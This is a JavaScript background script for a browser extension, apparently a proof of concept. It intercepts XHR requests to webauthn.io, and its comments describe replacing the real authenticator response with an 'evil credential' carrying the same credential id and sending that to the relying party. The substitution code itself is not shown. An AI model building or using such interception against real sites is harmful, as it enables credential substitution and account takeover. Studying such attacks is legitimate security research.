import ResponseFilter from "./response-filter";
import RequestHandler from "./request-handler";
import {WebAuthnMatcher, Type} from "./web-authn-matcher";

/**
 * This is the entry point to intercept responses. It registers a
 * listener that fires on all XHR responses.
 */
browser.webRequest.onBeforeRequest.addListener(
    filterResponse,
    { urls: ["https://webauthn.io/*"], types: ["xmlhttprequest"] },
    ['requestBody', 'blocking']
);

/**
 * Filters the webAuthN requests and processes them. Leaves other requests 
 * untouched.
 * 
 * @param {object} details
 */
function filterResponse(details) {
    const promise = ResponseFilter.getBody(details);

    promise.then(body => {
        const matcher = new WebAuthnMatcher(body);
        const type = matcher.analyze();

        if (Type.unknown === type) {
            return;
        }

        console.log(`${type} intercepted. Launching request handler.`);

        // wait for response from authenticator
        // then drop this response, create evil credential with the same
        // credential id as the real credential and save it to local storage
        // using the credential id as key.
        // then send the evil credential to the RP

        // register a listener that intercepts all requests to this RP
        const handler = new RequestHandler(matcher.webAuthnData, details.originUrl);
        handler.listenForCredential();
    });
}